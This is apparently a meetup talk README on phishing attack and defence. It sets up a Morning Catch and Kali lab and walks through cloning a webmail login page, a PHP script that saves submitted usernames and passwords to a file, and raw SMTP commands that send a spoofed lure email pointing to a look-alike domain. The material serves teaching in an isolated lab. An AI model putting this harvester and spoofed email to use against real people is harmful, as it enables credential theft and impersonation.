# Intro to Phishing: Attack and Defense
## Topic
Phishing is one of the few attack vectors that has become more popular over time, even today large campaigns are carried out against the general public and spear phishing attacks are targeting specific corporations. This week we will be looking at examples of past attacks, the different stages of the phishing process and how you can defend your company or family and friends against attacks. There will be a demo of a credential harvesting attack using "Morning Catch", you can follow along during the talk by setting up the VM environment detailed here: https://github.com/dc865/presentations/blob/master/intro-to-phishing/README.md

## Demo Environment

### Downloads

 - [Morning Catch - A Phising Paradise](http://blog.cobaltstrike.com/2014/08/06/introducing-morning-catch-a-phishing-paradise/)
 - [Morning Catch VulnHub.com Download](https://www.vulnhub.com/entry/morning-catch-phishing-industries,101/)
 - [Kali Linux Downloads](https://www.kali.org/downloads/)

### Virtual Machine Setup

#### VMware Player 

Morning Catch
 - Unzip morningcatch.zip
 - Open it by selecting the **Mint.vmx** file
 - Edit the virtual machine settings and change the network adapter from NAT to Host Only. 

Kali Linux
 - Create a new virtual machine and select the Kali iso as the installation media 
 - Follow the setup instructions and change the Network Adapter to Host Only
 - Choose Install from the Kali boot menu and follow the installation instructions 

#### VirtualBox 

Morning Catch 
 - unzip morningcatch.zip
 - Create a new virtual machine and use Mint.vmdk as the storage device
 - Set the networking to Host Only 

Kali Linux
 - Create a new virtual machine and select the Kali iso as the installation media 
 - Follow the setup instructions and change the Network Adapter to Host Only
 - Choose Install from the Kali boot menu and follow the installation instructions 

### Networking Setup

Add the Kali host entry to /etc/hosts in Morning Catch:

```
<Attacker IP>	mornincatch.ph
```


Add the Morning Catch and Kali host entries to /etc/hosts on the Kali VM: 

```
<Attacker IP>	mornincatch.ph
<Victim IP>	morningcatch.ph
```

### Test the Demo Environment

On Morning Catch log in as Boyd Jenius and open a terminal. Try to ping the Kali VM using the hostname you added to /etc/hosts:

```bash
$ ping mornincatch.ph
```

On the Kali VM log in using the account you created and verify that the morningcatch.ph services are available:

```bash
$ ping morningcatch.ph
$ nc -z morningcatch.ph 25
$ firefox morningcatch.ph
```

### Cloning morningcatch.ph

Using wget we can clone the site: 

```bash
wget -r -l1 -k -p morningcatch.ph/mail/
sudo mv morningcatch.ph/mail /var/www/html/
sudo vim /var/www/html/mail/index.html
```

In order to capture the credentials entered into our site we need to modify the login form to call a php script that will save the form input to disk.

Old post element:

```html
<form name="form" action="index.html" method="post">
```

New post element:

```html
<form name="form" action="form.php" method="post">
```

### PHP Script for Saving Credentials

```php
<?php

$user = $_POST['_user'];
$pass = $_POST['_pass'];

$f = fopen("creds.txt", "a");

fwrite($f, "$user:$pass\n");

fclose();
header("Location: http://morningcatch.ph/mail/");
die();
?>
```

## Email Commands

```
telnet morningcatch.ph 25
ehlo morningcatch.ph
mail from: bjenius@morningcatch.ph
rcpt to: rbourne@morningcatch.ph
data
Subject: 

We are currently testing a new performance configuration for the webmail site, please test the site changes by visiting: http://mornincatch.ph/mail/

Boyd

.
quit
```
